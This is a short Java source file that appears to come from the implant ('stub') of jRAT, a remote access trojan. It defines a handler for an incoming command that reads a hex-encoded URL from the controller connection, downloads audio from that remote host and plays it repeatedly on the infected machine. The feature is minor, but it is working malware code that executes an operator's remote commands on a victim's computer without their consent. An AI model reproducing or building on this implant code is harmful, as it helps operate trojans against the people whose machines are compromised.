package se.jrat.stub.packets.incoming;

import java.net.URL;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;

import se.jrat.common.codec.Hex;
import se.jrat.stub.Connection;


public class Packet44PlaySoundFromURL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.instance.readLine();
		int times = Connection.instance.readInt();
		url = Hex.decode(url.substring(2, url.length()));
		URL u = new URL(url);
		AudioInputStream audioIn = AudioSystem.getAudioInputStream(u);
		Clip clip = AudioSystem.getClip();
		clip.open(audioIn);
		clip.loop(times == 0 ? 0 : times - 1);
	}

}
